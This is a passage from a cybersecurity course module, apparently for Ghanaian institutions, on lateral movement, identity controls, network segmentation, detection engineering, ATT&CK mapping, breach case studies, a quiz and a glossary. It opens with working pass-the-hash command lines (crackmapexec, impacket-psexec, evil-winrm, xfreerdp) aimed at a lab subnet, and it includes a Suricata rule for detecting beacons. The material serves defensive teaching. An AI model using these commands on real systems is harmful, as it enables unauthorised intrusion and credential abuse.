With a credential or just a hash, these move you host-to-host — the practical face
of pass-the-hash:

```Terminal — moving laterally (lab / sanctioned only)
crackmapexec smb 10.13.3.0/24 -u admin -H <NTLM-hash>    # spray a hash across a subnet (pass-the-hash)
impacket-psexec  lab/admin@10.13.3.40                    # SYSTEM shell via SMB (the PsExec tell: new service)
impacket-wmiexec lab/admin@10.13.3.40                    # quieter, via WMI
evil-winrm -i 10.13.3.40 -u admin -H <NTLM-hash>         # interactive WinRM shell with a hash
xfreerdp /u:admin /pth:<NTLM-hash> /v:10.13.3.40         # RDP with pass-the-hash
```

### 9.7 The identity controls that actually stop it

- **Phishing-resistant MFA.** Not all MFA is equal: SMS one-time codes are
  phishable and defeated by SIM-swap (Module 5); TOTP apps are better;
  **FIDO2/passkeys** are best — bound to the real site, immune to replay.
- **Tiering.** Separate admin accounts for workstations, servers and domain
  controllers, and **never** log a Domain Admin into an ordinary workstation —
  so a workstation compromise can't harvest a DA credential.
- **Unique local-admin passwords** (e.g. Microsoft **LAPS**) — so one stolen hash
  opens *one* machine, not all of them. This alone would have blunted NotPetya.
- **Privileged Access Management (PAM)** — just-in-time admin rights, vaulted
  credentials, recorded sessions — contains the damage when an account falls.
- **Detection signals:** impossible travel, off-hours privileged logon, a burst of
  SMB/WinRM connections from one host, or new service creation (the PsExec tell).

## 10 · Defensive Architecture — Keeping Small Things Small

Identity decides *whether* a foothold spreads; **architecture** decides *how far*.
Three ideas carry most of the weight.

**Defence in depth.** No single control is trusted to hold. You layer them —
perimeter firewall, segmentation, host firewall, EDR, MFA, monitoring — so the
failure of any one is not fatal. The attacker must defeat *every* layer; the
defender must hold *any* one.

**Zero Trust.** The old model trusted anything *inside* the perimeter — a hard
shell around a soft centre. Zero Trust assumes the attacker is **already inside**
and therefore *never trusts, always verifies*: every request is authenticated and
authorised, every time, regardless of where it originates.

**Segmentation.** Dividing the network so a breach in one zone cannot reach
another. Its opposite is the **flat network**, where everything can reach
everything — a single foothold then reaches the crown jewels unimpeded.
Segmentation is the single control that most often turns a catastrophe back into
a contained incident.

```figure Flat network vs segmented — why segmentation contains a breach
  FLAT:       [foothold] ─► payments ─► HR ─► core banking   (one hop reaches all)
  SEGMENTED:  [foothold] ─► ✗ | payments | ✗ core banking    (zones block the hop)
```

## 11 · Detecting It — the Blue-Team View

A professional doesn't only *find* a breach after the fact — they **engineer
detection** so the next one is caught in minutes. Every stage of this lab's attack
leaves a signal, if you are logging the right thing:

| Stage | The signal to watch | Where / tool | Control that contains it |
|-------|---------------------|--------------|--------------------------|
| Recon scan | a burst of SYNs to many ports from one source | IDS (Suricata/Snort), firewall logs | host firewall, least-exposure |
| Exposed service | a service appears that isn't in your inventory | your **own** monthly Nmap + asset list | close it / segment it |
| Cleartext creds | a password visible in a packet payload | IDS content match | SFTP/SSH, egress DLP |
| **C2 DNS beacon** | repeated fixed-interval lookups to dynamic DNS | **DNS query logging**, Suricata | DNS firewall / sinkhole |
| LLMNR/ARP poisoning | gratuitous ARP; a host answering LLMNR for everything | Zeek, switch logs, arpwatch | disable LLMNR/NBT-NS, DAI, SMB signing |
| Kerberoasting | a burst of TGS (service-ticket) requests, esp. RC4 | Windows event **4769**, SIEM | long/gMSA service passwords, alert on 4769 volume |
| Priv-esc / persistence | new service, scheduled task, run-key, SUID change | **Sysmon** (1/11/13), auditd | least privilege, allow-listing, file-integrity monitoring |
| Lateral movement | PsExec service creation; hash reuse across hosts | Windows **7045/4624 type 3**, EDR | LAPS, tiering, disable NTLM |
| Masquerade (`svch0st`) | a process whose name/path/signature is wrong | **EDR**, Sysmon | application allow-listing |
| Exfiltration | large sustained outbound to a new IP | **NetFlow**, Zeek, Wireshark Conversations | egress filtering |

The highest-value, lowest-cost detection for a Ghanaian institution is **DNS query
logging** — because ~90% of malware beacons over DNS, and you cannot detect what
you do not log. A simple IDS rule turns that log into an alert:

```Terminal — a Suricata rule that flags the beacon pattern
alert dns $HOME_NET any -> any any ( \
    msg:"CAIC M3 - repeated dynamic-DNS lookup (possible C2 beacon)"; \
    dns.query; content:".ddns.net"; endswith; \
    threshold: type both, track by_src, count 5, seconds 300; \
    sid:1000031; rev:1; )
# fires when one host makes 5+ lookups to a .ddns.net domain within 5 minutes
```

::: key | You cannot detect what you do not log
Before any clever rule: turn on **DNS query logging**, central **authentication
logs**, and **NetFlow/egress logging**. Most breached institutions already *had*
the evidence of the beacon and the exfil — they simply were not recording or
reviewing it. Logging is the prerequisite; the rule is the easy part.
:::

## 12 · Mapping the Chain to MITRE ATT&CK

Every step of a network compromise maps to a technique. Naming them gives your
report a shared, defensible vocabulary and lets you check coverage.

| Stage | What happened | ATT&CK technique |
|-------|---------------|------------------|
| Reconnaissance | Scanning for live hosts and services | **T1046** Network Service Discovery |
| Discovery (enumeration) | SMB/LDAP/SNMP enumeration of users, shares, groups | T1087 Account Discovery; T1135 Network Share Discovery |
| Credential Access (network) | LLMNR/NBT-NS poisoning (Responder); ARP MITM | **T1557.001** LLMNR/NBT-NS Poisoning; T1557.002 ARP Cache Poisoning |
| Credential Access (sniffing) | Cleartext creds on the wire; Wi-Fi handshake | T1040 Network Sniffing |
| Initial Access | Anonymous FTP; valid captured credentials | T1078 Valid Accounts |
| Persistence | Run key / scheduled task / service / cron / SSH key | T1547, T1053, **T1543**, T1098.004 |
| Privilege Escalation | sudo/SUID/service misconfig → root/SYSTEM | **T1548** Abuse Elevation Control; T1068 |
| Defense Evasion | `svch0st` posing as `svchost`; LOLBAS/GTFOBins | **T1036** Masquerading; T1218/T1059 |
| Credential Access (dumping) | LSASS/Mimikatz; `dcsync`; `/etc/shadow` | **T1003** OS Credential Dumping (T1003.006 DCSync) |
| Credential Access (cracking) | Kerberoasting; AS-REP roasting; brute/spray | **T1558.003**, T1558.004; T1110 Brute Force |
| Command and Control | DNS beacon to a dynamic-DNS domain | **T1071.004** Application Layer Protocol: DNS |
| Lateral Movement | Pass-the-hash / remote services (SMB, RDP, WinRM) | **T1550.002** Pass-the-Hash; T1021 Remote Services |

Recall the **Pyramid of Pain** from Module 1: blocking the C2 *IP* or *domain*
(bottom of the pyramid) is cheap for the attacker to change. Detecting the
*behaviour* — "any host beaconing to dynamic DNS on a fixed interval" (TTP, top
of the pyramid) — causes them real pain, because they would have to change *how
they operate*, not just *which address they use*.

## 13 · Scenarios — Why Flat Networks and Exposed Services Cost Millions

::: ghana | Ghana & West Africa
- **The forgotten remote-access port.** A large share of West African intrusions
  begin with an RDP or SSH port opened "temporarily" for a vendor and never
  closed. Internet-wide scanners (Shodan, Censys) index it within *hours*. The
  discipline that prevents it is free: **scan your own ranges monthly with the
  same Nmap**, before someone else does.
- **Cloud misconfiguration is the regional epidemic.** Public storage buckets,
  databases listening on the open internet, default admin credentials left in
  place. Treat cloud security groups as part of your network perimeter and audit
  them quarterly.
- **MoMo-linked fraud infrastructure.** Beaconing hosts inside fintech and agent
  networks have been traced to credential-harvesting and transaction-tampering
  operations — exactly the chain this lab recreates.
:::

::: case | Target, 2013 — ~40 million payment cards
Attackers entered through an **HVAC vendor's** stolen credentials, then moved
freely to the point-of-sale systems because the network was **flat** — the
vendor's segment could reach the payment environment. The intrusion was small;
the catastrophe was architectural. **Segmentation** would have contained it. This
is a textbook Lateral Movement and poor-segmentation case, and it reshaped
retail security worldwide.
:::

::: case | NotPetya, 2017 — ~US$10 billion in global damage
Once inside, the worm spread uncontrolled across flat, trusted internal networks,
reaching global scale within hours and crippling shipping giant Maersk among many
others. **Zero Trust and segmentation** are the direct architectural answers to
exactly this failure mode.
:::

The through-line of every case: the *initial* foothold is usually small; the
disaster comes from a **flat network and weak identity** that let it spread.

## Common mistakes

::: warning | What trips students up
- **Pointing offensive tools outside the sandbox.** Nmap, Responder, aircrack-ng,
  Mimikatz, hydra against anything other than `10.13.3.x`, your own kit, or a
  sanctioned range is wrong and unlawful (Act 1038). This is the cardinal rule.
- **Scanning but not enumerating.** "445 open" is a lead; the shares, users, SMB
  signing state and password policy behind it are the finding. Always enumerate.
- **Confusing capture and display filters.** The first decides what is *recorded*
  (and lost if omitted); the second decides what is *shown*.
- **Confusing online and offline cracking.** Online guessing (hydra) trips lockout
  and is slow; offline cracking (hashcat on stolen hashes) has no lockout — which
  is why a hashed-password dump is still a breach.
- **Thinking "hashed = safe".** MD5/NTLM fall in seconds; only *slow, salted*
  hashes (bcrypt/argon2) and *length* (15+ chars) protect a password.
- **Leaving LLMNR/NBT-NS on and SMB signing off.** That one pairing hands Responder
  free credentials and enables relay in most AD networks.
- **Treating Wi-Fi as inside the trust boundary.** A cracked WPA2 passphrase puts
  the attacker past the firewall; Wi-Fi is untrusted — segment it.
- **Dismissing a "small" open port.** An unauthenticated admin panel or an open
  4444 is a full compromise, not a minor note.
- **Assuming encrypted = safe.** TLS hides the *content*, not the *pattern* — a
  beacon's timing is visible even when its payload is not.
- **Reading `svchost` where it says `svch0st`.** Masquerading defeats the hurried.
  Read process names character by character.
- **Reporting one source.** A finding that the scan, the capture *and* the host
  table all support is proof; a finding from one tool is a lead.
:::

## Key takeaways

::: key | Carry these out of Module 3 — the three pillars
**Network**
- **Ports are doors, protocols are languages; name the layer and you name the
  control.** Nmap/masscan find the open doors; **enumeration** (SMB/SNMP/LDAP)
  turns them into findings; NSE turns a scan into a triage.
- **Layer-2 is trust by default:** ARP and LLMNR/NBT-NS authenticate nobody, so
  **Responder** and ARP-spoofing give MITM for free. Kill them with **DAI, SMB
  signing, and disabling LLMNR/NBT-NS**.
- **Wi-Fi is untrusted air:** a WPA2 handshake cracks offline against a weak
  passphrase. Use **WPA3 / 802.1X**, long passphrases, no WPS, and segment it.
- **Cleartext protocols leak credentials** — follow the TCP stream. Replace
  FTP/Telnet with SFTP/SSH. **C2 beacon = same destination + fixed interval**,
  usually over **DNS** — so monitor it.

**Endpoint**
- **Read the host properly:** connection table (odd `LISTEN` = backdoor,
  `ESTABLISHED` to a strange IP = live C2), **process lineage**, autostarts.
  Watch for **masquerading** names.
- **Persistence lives in known places** (run keys, tasks, services, cron, SSH
  keys) — hunt them; **privilege escalation is a hygiene failure** found with
  the same **winPEAS/linPEAS/GTFOBins** attackers use.

**Identity**
- **Credentials are the master key.** Length + **MFA** + slow salted hashes beat
  cracking; **spraying** and **Kerberoasting/AS-REP** need no admin at all.
- **A foothold becomes a takeover** through credential dumping (**Mimikatz/
  LSASS**, `dcsync`) and **lateral movement** (pass-the-hash over SMB/RDP/WinRM).
  **BloodHound** maps the path; **tiering, LAPS, gMSA, PAM, Credential Guard,
  phishing-resistant MFA and disabling NTLM** cut it.

**Defend & detect**
- **Correlate** scan + capture + host table; the top architectural control is
  **segmentation** backed by **Zero Trust**. **Engineer detection** (DNS logging,
  Suricata/Zeek, **Sysmon**, EDR, NetFlow, event 4769/7045) — *you cannot detect
  what you do not log.*
- **ATT&CK across the chain:** T1046/T1087 (recon/enum), T1557 (poisoning), T1040
  (sniffing), T1548/T1068 (privesc), T1036 (masquerade), T1003/.006 (dumping/
  dcsync), T1558.003/.004 (Kerberoast/AS-REP), T1071.004 (DNS C2), T1550.002 +
  T1021 (pass-the-hash / remote services).
:::

## Check yourself

1. **`nmap -sn` vs `nmap -sV` — what does each do?**
   → `-sn` only discovers which hosts are alive (no port scan); `-sV` scans ports
   *and* identifies the service and version behind each open one.

2. **A host queries `cdn-update.ddns.net` every ~30 seconds all night. Benign or
   suspicious, and why?**
   → Suspicious — a fixed, round-the-clock interval to a dynamic-DNS domain is
   classic C2 beaconing; genuine user traffic is irregular and bursty.

3. **You see `svch0st.exe` LISTENING on 4444 and ESTABLISHED to a public IP, same
   PID. Explain the two behaviours.**
   → One implant doing two things: the `LISTEN` on 4444 is a **backdoor** for the
   operator to return; the `ESTABLISHED` line is the live **C2** channel. The
   name is a **masquerade** of `svchost`.

4. **Target 2013: entry was a vendor account, but the catastrophe was
   architectural. What was the failure?**
   → A **flat network** — the vendor segment could reach the payment systems.
   Segmentation (and Zero Trust) would have contained it.

5. **Why is SMS MFA weaker than a FIDO2 security key?**
   → SMS codes are phishable and defeated by SIM-swap; FIDO2/passkeys are
   phishing-resistant and cryptographically bound to the legitimate site.

6. **What single control most often turns a breach back into a contained
   incident, and why?**
   → **Segmentation** — it stops a small foothold from reaching high-value
   systems, which is where the real damage is done.

7. **An attacker has local admin on one workstation. Explain how that becomes
   domain-wide control, and name two controls that break the chain.**
   → They dump credentials from memory and **pass-the-hash** to other hosts over
   SMB/RDP/WinRM (lateral movement), hunting the domain controller. Break it with
   **unique local-admin passwords (LAPS)**, **admin-account tiering**, **PAM** and
   **phishing-resistant MFA** — any of which stops one stolen hash opening every
   machine.

8. **Your institution can fund exactly one new log source. Which, and why?**
   → **DNS query logging** — ~90% of malware beacons over DNS, so it catches the
   C2 stage cheaply; you cannot detect what you do not log.

9. **A port scan shows SMB (445) open. Why is that not yet a finding, and what do
   you do next?**
   → "Open" is a lead. **Enumerate** it (`enum4linux-ng`, `smbmap`, `rpcclient`):
   discover shares, users, SMB-signing state and password policy. The finding is
   "anonymous read on `HR$`, signing off, 6-char policy" — not "445 open".

10. **What is LLMNR/NBT-NS poisoning, what does Responder capture, and the one-line
    fix?**
    → When DNS fails, Windows broadcasts a name query; Responder answers and the
    victim sends its **NetNTLM hash**, which is cracked offline or relayed. Fix:
    **disable LLMNR and NBT-NS** (Group Policy) and **enforce SMB signing**.

11. **Why can a weak WPA2 Wi-Fi password be cracked, and what stops it?**
    → The **4-way handshake** (often forced via a **deauth**) contains material to
    guess the passphrase **offline** with a wordlist. Stop it with **WPA3** or a
    long random passphrase, **disable WPS**, and use **802.1X** for corporate SSIDs.

12. **Online vs offline password attack — which hash type is "safe", and why does
    MFA matter either way?**
    → Online guessing hits a live service (slow, lockout); offline cracking works
    on stolen hashes (no lockout). **Slow, salted** hashes (bcrypt/argon2) resist
    cracking; **MD5/NTLM** fall fast. **MFA** makes even a cracked password
    insufficient on its own.

13. **What is Kerberoasting, why can any normal user do it, and the fix?**
    → Any domain user can request a service ticket for an SPN account; the ticket
    is encrypted with the **service account's password hash**, crackable offline
    (`hashcat -m 13100`). Fix: **25+ char random passwords or gMSA**, require
    pre-auth, alert on event **4769** volume.

14. **You compromised one user account. How does BloodHound help you reach Domain
    Admin — and how does it help the defender?**
    → It graphs AD (groups, ACLs, sessions, local-admin rights) and computes the
    **shortest path to Domain Admin**. Attackers walk it; **defenders run the same
    tool to find and cut the path first**.

## Glossary

- **Port / protocol** — a numbered service endpoint / the language spoken through it.
- **OSI & TCP/IP** — the layer models that locate attacks and controls.
- **Nmap / NSE** — the network scanner / its scripting engine for targeted checks.
- **Capture filter / display filter** — what is *recorded* / what is *shown*.
- **Follow TCP Stream** — Wireshark's reassembly of one conversation end to end.
- **C2 / beaconing** — malware's control channel / its regular check-ins.
- **Jitter** — deliberate random variation in beacon timing, used to evade detection.
- **LISTEN / ESTABLISHED** — a socket awaiting connections / an active connection.
- **Backdoor** — a hidden listening port an attacker uses to return.
- **Masquerading (T1036)** — malware named to impersonate a trusted process.
- **Defence in depth / Zero Trust / segmentation** — layered controls / never-trust-always-verify / dividing the network to contain breaches.
- **Three-way handshake** — SYN → SYN-ACK → ACK; a SYN scan reads the first reply to learn open/closed/filtered.
- **Active Directory / Kerberos** — the enterprise identity directory / its ticket-based authentication; the domain controller is the prize.
- **Pass-the-Hash (T1550.002)** — authenticating with a stolen password hash, no plaintext needed.
- **Lateral movement** — hopping host to host with stolen credentials (SMB/RDP/WinRM).
- **Tiering / LAPS** — separating admin accounts by sensitivity / unique local-admin passwords per machine.
- **IDS / Suricata / Zeek / NetFlow** — intrusion-detection system / a signature IDS / a network-analysis/logging engine / summarised flow records (for spotting exfil).
- **PAM / MFA** — privileged access management / multi-factor authentication.
- **Enumeration** — interrogating a discovered service for users, shares, versions and policy (the phase that produces findings).
- **masscan** — a very fast port scanner for large ranges; feed its results to Nmap for detail.
- **SMB / null session / SMB signing** — Windows file sharing (445) / an anonymous SMB login / the integrity check that defeats NTLM relay.
- **Responder / LLMNR–NBT-NS poisoning (T1557.001)** — the tool / answering a victim's name broadcast to capture its NetNTLM hash.
- **ARP spoofing / MITM (T1557.002)** — forging ARP replies to sit in the middle of traffic; bettercap/ettercap/arpspoof.
- **4-way handshake / deauth / Evil Twin / WPS** — WPA2's join exchange (crackable offline) / forcing a reconnect / a rogue look-alike AP / the brute-forceable Wi-Fi pin (turn it off).
- **WPA3 / 802.1X / PMF** — modern Wi-Fi crypto resistant to offline guessing / per-user certificate auth / protected management frames (blunts deauth).
- **aircrack-ng / hcxdumptool** — the classic Wi-Fi capture-and-crack suite / a modern handshake capture tool (→ hashcat `-m 22000`).
- **Sysmon** — a Windows logging agent recording process creation, network connections, etc.; the backbone of endpoint detection.
- **LOLBAS / GTFOBins** — catalogues of trusted OS binaries abusable by attackers (Windows / Unix).
- **Persistence (TA0003)** — mechanisms that survive reboot: run keys, scheduled tasks, services, cron, systemd, SSH keys.
- **Privilege escalation** — moving from a normal user to root/SYSTEM, usually via misconfiguration (sudo, SUID, weak service perms); hunt with winPEAS/linPEAS.
- **hydra / John / hashcat** — online login guesser / offline cracker / GPU offline cracker (hash *modes*, *rules*, *masks*).
- **Password spray (T1110.003)** — one common password tried across many accounts to evade lockout (CrackMapExec/nxc, kerbrute).
- **Mimikatz / LSASS / dcsync / Golden Ticket** — credential-dumping tool / the Windows process holding secrets / pulling any hash via DC replication / a forged domain-wide Kerberos ticket.
- **Kerberoasting (T1558.003) / AS-REP roasting (T1558.004) / SPN** — crack a service account via its TGS / crack a no-pre-auth account / the service identifier that makes Kerberoasting possible.
- **gMSA / Credential Guard** — auto-rotating managed service-account passwords / Windows protection that stops LSASS secret theft.
- **BloodHound** — graphs Active Directory to compute attack paths to Domain Admin (attackers find them; defenders cut them).
- **CrackMapExec (nxc) / impacket / evil-winrm** — multi-protocol post-exploitation sweep / Python toolkit (psexec/wmiexec/secretsdump/GetUserSPNs) / an interactive WinRM shell.
